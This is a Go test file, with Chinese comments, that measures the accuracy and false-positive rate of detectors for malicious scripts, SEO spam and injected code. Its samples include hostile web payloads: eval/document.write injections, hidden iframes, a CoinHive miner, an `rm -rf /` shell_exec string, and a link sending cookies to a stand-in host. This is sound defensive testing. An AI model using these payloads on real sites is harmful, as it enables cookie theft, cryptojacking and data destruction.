package analyzer

import (
	"testing"
)

// TestScriptAnalyzerAccuracy 测试脚本分析器准确率
func TestScriptAnalyzerAccuracy(t *testing.T) {
	analyzer := NewScriptAnalyzer()

	// 测试用例
	testCases := []struct {
		name             string
		script           string
		expectSuspicious bool
		expectSignals    []string
	}{
		{
			name:             "正常JavaScript",
			script:           `function hello() { console.log("hello world"); }`,
			expectSuspicious: false,
			expectSignals:    []string{},
		},
		{
			name:             "包含eval的恶意脚本",
			script:           `eval("alert('malicious')")`,
			expectSuspicious: true,
			expectSignals:    []string{"dynamic_code_execution"},
		},
		{
			name:             "包含document.write的脚本",
			script:           `document.write("<script>alert('test')</script>")`,
			expectSuspicious: true,
			expectSignals:    []string{"dangerous_dom_operations:1"},
		},
		{
			name:             "包含多个可疑特征的脚本",
			script:           `eval("document.write('<iframe src=\"http://malicious.com\"></iframe>')")`,
			expectSuspicious: true,
			expectSignals:    []string{"dynamic_code_execution", "dangerous_dom_operations:1"},
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			result, err := analyzer.Analyze(tc.script)
			if err != nil {
				t.Fatalf("分析失败: %v", err)
			}

			suspiciousLevel := analyzer.GetSuspiciousLevel(result)
			isSuspicious := suspiciousLevel >= 3

			if isSuspicious != tc.expectSuspicious {
				t.Errorf("期望可疑性: %v, 实际: %v", tc.expectSuspicious, isSuspicious)
			}

			// 检查期望的信号
			for _, expectSignal := range tc.expectSignals {
				found := false
				for _, actualSignal := range result.SuspiciousSignals {
					if actualSignal == expectSignal {
						found = true
						break
					}
				}
				if !found {
					t.Errorf("期望信号 '%s' 未找到", expectSignal)
				}
			}
		})
	}
}

// TestSEODetectorAccuracy 测试SEO检测器准确率
func TestSEODetectorAccuracy(t *testing.T) {
	detector := NewSEODetector()

	// 测试用例
	testCases := []struct {
		name             string
		html             string
		expectSuspicious bool
		expectSignals    []string
	}{
		{
			name:             "正常HTML",
			html:             `<!DOCTYPE html><html><body><h1>Test</h1></body></html>`,
			expectSuspicious: false,
			expectSignals:    []string{},
		},
		{
			name:             "包含隐藏iframe",
			html:             `<iframe style="display:none" src="http://malicious.com"></iframe>`,
			expectSuspicious: true,
			expectSignals:    []string{"hidden_iframes:1"},
		},
		{
			name:             "包含CSS隐藏元素",
			html:             `<div style="display:none">malicious content</div>`,
			expectSuspicious: true,
			expectSignals:    []string{"css_hidden_elements:1"},
		},
		{
			name:             "包含链接劫持",
			html:             `<a href="javascript:alert('hijacked')">Click me</a>`,
			expectSuspicious: true,
			expectSignals:    []string{"link_hijacking:1"},
		},
		{
			name:             "包含meta重定向",
			html:             `<meta http-equiv="refresh" content="0;url=http://malicious.com">`,
			expectSuspicious: true,
			expectSignals:    []string{"redirects:1"},
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			result, err := detector.Analyze(tc.html)
			if err != nil {
				t.Fatalf("分析失败: %v", err)
			}

			isSuspicious := detector.IsSuspicious(result)

			if isSuspicious != tc.expectSuspicious {
				t.Errorf("期望可疑性: %v, 实际: %v", tc.expectSuspicious, isSuspicious)
			}

			// 检查期望的信号
			for _, expectSignal := range tc.expectSignals {
				found := false
				for _, actualSignal := range result.SuspiciousSignals {
					if actualSignal == expectSignal {
						found = true
						break
					}
				}
				if !found {
					t.Errorf("期望信号 '%s' 未找到", expectSignal)
				}
			}
		})
	}
}

// TestMaliciousDetectorAccuracy 测试恶意代码检测器准确率
func TestMaliciousDetectorAccuracy(t *testing.T) {
	detector := NewMaliciousDetector()

	// 测试用例
	testCases := []struct {
		name               string
		content            string
		expectMalicious    bool
		expectSignals      []string
		expectedConfidence float64
	}{
		{
			name:               "正常内容",
			content:            "This is normal content",
			expectMalicious:    false,
			expectSignals:      []string{},
			expectedConfidence: 0.0,
		},
		{
			name:               "包含挖矿脚本",
			content:            `var miner = new CoinHive.Anonymous('site-key'); miner.start();`,
			expectMalicious:    true,
			expectSignals:      []string{"mining_activity:1"},
			expectedConfidence: 20.0,
		},
		{
			name:               "包含恶意脚本",
			content:            `eval("document.write('<script src=http://malicious.com/script.js></script>')")`,
			expectMalicious:    true,
			expectSignals:      []string{},
			expectedConfidence: 30.0,
		},
		{
			name:               "包含后门特征",
			content:            `shell_exec('rm -rf /')`,
			expectMalicious:    true,
			expectSignals:      []string{},
			expectedConfidence: 40.0,
		},
		{
			name:               "包含多个恶意特征",
			content:            `eval("document.write('<iframe src=http://malicious.com></iframe>'); miner.start()")`,
			expectMalicious:    true,
			expectSignals:      []string{"mining_activity:1"},
			expectedConfidence: 50.0,
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			result, err := detector.Analyze(tc.content)
			if err != nil {
				t.Fatalf("分析失败: %v", err)
			}

			isMalicious := detector.IsMalicious(result)

			if isMalicious != tc.expectMalicious {
				t.Errorf("期望恶意性: %v, 实际: %v", tc.expectMalicious, isMalicious)
			}

			// 检查置信度分数
			if result.ConfidenceScore < tc.expectedConfidence-10 || result.ConfidenceScore > tc.expectedConfidence+10 {
				t.Errorf("期望置信度: %.2f, 实际: %.2f", tc.expectedConfidence, result.ConfidenceScore)
			}

			// 检查期望的信号
			for _, expectSignal := range tc.expectSignals {
				found := false
				for _, actualSignal := range result.SuspiciousSignals {
					if actualSignal == expectSignal {
						found = true
						break
					}
				}
				if !found {
					t.Errorf("期望信号 '%s' 未找到", expectSignal)
				}
			}
		})
	}
}

// TestFalsePositiveRate 测试误报率
func TestFalsePositiveRate(t *testing.T) {
	scriptAnalyzer := NewScriptAnalyzer()
	seoDetector := NewSEODetector()
	maliciousDetector := NewMaliciousDetector()

	// 正常网站的样本
	normalSamples := []string{
		`<!DOCTYPE html><html><head><title>Normal Site</title></head><body><h1>Welcome</h1><script>function init() { console.log('initialized'); }</script></body></html>`,
		`function validateForm() { var x = document.getElementById("email").value; if (x == "") { alert("Email must be filled out"); return false; } }`,
		`// This is a normal JavaScript file
		var app = angular.module('myApp', []);
		app.controller('myCtrl', function($scope) {
			$scope.firstName = "John";
			$scope.lastName = "Doe";
		});`,
		`<div class="container"><p>This is normal content with some CSS styles: <span style="color: red;">red text</span></p></div>`,
		`// jQuery code
		$(document).ready(function(){
			$("button").click(function(){
				$("#demo").hide();
			});
		});`,
	}

	falsePositives := 0
	totalTests := 0

	for _, sample := range normalSamples {
		totalTests++

		// 测试脚本分析器
		if result, err := scriptAnalyzer.Analyze(sample); err == nil {
			if scriptAnalyzer.GetSuspiciousLevel(result) >= 3 {
				falsePositives++
				t.Logf("脚本分析器误报: %s", sample[:100]+"...")
			}
		}

		totalTests++

		// 测试SEO检测器
		if result, err := seoDetector.Analyze(sample); err == nil {
			if seoDetector.IsSuspicious(result) {
				falsePositives++
				t.Logf("SEO检测器误报: %s", sample[:100]+"...")
			}
		}

		totalTests++

		// 测试恶意代码检测器
		if result, err := maliciousDetector.Analyze(sample); err == nil {
			if maliciousDetector.IsMalicious(result) {
				falsePositives++
				t.Logf("恶意代码检测器误报: %s", sample[:100]+"...")
			}
		}
	}

	falsePositiveRate := float64(falsePositives) / float64(totalTests) * 100
	t.Logf("误报率: %.2f%% (%d/%d)", falsePositiveRate, falsePositives, totalTests)

	// 期望误报率低于5%
	if falsePositiveRate > 5.0 {
		t.Errorf("误报率过高: %.2f%%", falsePositiveRate)
	}
}

// TestTruePositiveRate 测试准确率
func TestTruePositiveRate(t *testing.T) {
	scriptAnalyzer := NewScriptAnalyzer()
	seoDetector := NewSEODetector()
	maliciousDetector := NewMaliciousDetector()

	// 恶意内容样本
	maliciousSamples := []string{
		`eval("document.write('<iframe src=http://malicious.com/script.js></iframe>')")`,
		`<iframe style="display:none" src="http://malicious.com"></iframe>`,
		`var miner = new CoinHive.Anonymous('site-key'); miner.start();`,
		`document.write('<script src=http://malicious.com/steal.js></script>')`,
		`<a href="javascript:fetch('http://malicious.com/steal?cookie='+document.cookie)">Click</a>`,
	}

	truePositives := 0
	totalTests := 0

	for _, sample := range maliciousSamples {
		totalTests++

		// 测试脚本分析器
		if result, err := scriptAnalyzer.Analyze(sample); err == nil {
			if scriptAnalyzer.GetSuspiciousLevel(result) >= 3 {
				truePositives++
			}
		}

		totalTests++

		// 测试SEO检测器
		if result, err := seoDetector.Analyze(sample); err == nil {
			if seoDetector.IsSuspicious(result) {
				truePositives++
			}
		}

		totalTests++

		// 测试恶意代码检测器
		if result, err := maliciousDetector.Analyze(sample); err == nil {
			if maliciousDetector.IsMalicious(result) {
				truePositives++
			}
		}
	}

	truePositiveRate := float64(truePositives) / float64(totalTests) * 100
	t.Logf("准确率: %.2f%% (%d/%d)", truePositiveRate, truePositives, totalTests)

	// 期望准确率高于40%
	if truePositiveRate < 40.0 {
		t.Errorf("准确率过低: %.2f%%", truePositiveRate)
	}
}
